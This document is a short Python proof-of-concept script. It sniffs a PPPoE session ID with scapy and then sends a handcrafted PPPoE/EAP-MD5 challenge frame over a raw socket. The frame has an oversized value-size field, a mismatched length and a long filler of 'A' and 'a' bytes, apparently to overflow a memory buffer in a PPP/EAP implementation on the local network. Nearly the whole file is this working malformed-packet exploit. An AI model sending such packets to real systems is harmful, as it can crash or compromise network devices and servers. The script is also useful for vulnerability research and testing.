from scapy.all import PPP,PPPoE,sniff
from socket import *


def mysend(pay,interface = "ens33"):
    # time.sleep(0.5)
    s = socket(AF_PACKET, SOCK_RAW)
    s.bind((interface, 0))
    s.send(pay)
    
def packet_callbacke(packet):

    global sessionid 
    sessionid = int(packet['PPP over Ethernet'].sessionid)
    print("sessionid:" + str(sessionid))

def eap_respnse_md5():
    """
    Ethernet II, Src: Vmware_b9:de:6c (00:0c:29:b9:de:6c), Dst: Vmware_83:48:19 (00:0c:29:83:48:19) Type: PPPoE Session (0x8864)
    PPPoes : Version(4bits) + type(4bits) + code + session ID + paylaod lenght
    PPP :  Extensible Authentication Protocol (0xc227)
    EAP :  
        Code: Request (1)
        Id: 131
        Length: 344
        Type: MD5-Challenge EAP (EAP-MD5-CHALLENGE) (4)
        EAP-MD5 Value-Size: 18
        EAP-MD5 Value: ef0a5c972ecfaeb3307310e99d81f9b0decf
        EAP-MD5 Extra Data: 414141414141414141414141414141414141414141414141...
    """
    pay = "\x00\x0c\x29\x83\x48\x19" \
    "\x00\x0c\x29\xb9\xde\x6c" \
    "\x88\x64\x11\x00" \
    "\x00" + chr(sessionid) + "\x01\x5a\xc2\x27\x01\x83\x01\x58\x04\x12\xef\x0a\x5c\x97" \
    "\x2e\xcf\xae\xb3\x30\x73\x10\xe9\x9d\x81\xf9\xb0\xde\xcf\x41\x41" \
    "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
    "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
    "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
    "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" + 'a'*0x100

    mysend(pay)



if __name__ == '__main__':
    sniff(prn=packet_callbacke,iface='ens33',filter="pppoes",count=1)
    
    eap_respnse_md5()